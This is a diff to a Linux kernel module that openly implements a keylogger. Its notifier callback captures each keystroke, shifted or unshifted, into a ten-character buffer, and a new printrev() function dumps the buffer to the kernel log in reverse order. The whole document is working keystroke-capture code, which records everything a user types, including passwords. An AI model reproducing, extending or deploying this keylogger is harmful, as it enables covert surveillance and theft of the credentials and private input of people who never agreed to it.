@@ -8,6 +8,17 @@ struct semaphore sem;
 
 static int shiftKeyPressed = 0;
 
+int j = 0;
+int numChars = 10;
+char* op[10];
+
+void printrev(void){
+	int i;
+	for(i=0;i<numChars;i++){
+		printk(KERN_INFO "%s\n",op[numChars-1-i]);
+	}
+	printk(KERN_INFO "------------------------------------");
+}
 
 
 int keylogger_notify(struct notifier_block *nblock, unsigned long code,
@@ -32,11 +43,23 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code,
         
 {            down(&sem);
             if (shiftKeyPressed == 0){
-                printk(KERN_INFO "%s\n", keymap[param->value]);
+                op[j] = keymap[param->value];
+                j++;
+                if(j==numChars){
+                	printrev();
+                	j = 0;
+                }
+                // printk(KERN_INFO "%s\n", keymap[param->value]);
 
             }
             else{
-                printk(KERN_INFO "%s\n", keymapShiftActivated[param->value]);
+                // printk(KERN_INFO "%s\n", keymapShiftActivated[param->value]);
+                op[j] = keymapShiftActivated[param->value];
+                j++;
+                if(j==numChars){
+                	printrev();
+                	j = 0;
+                }
 
             }
             up(&sem);
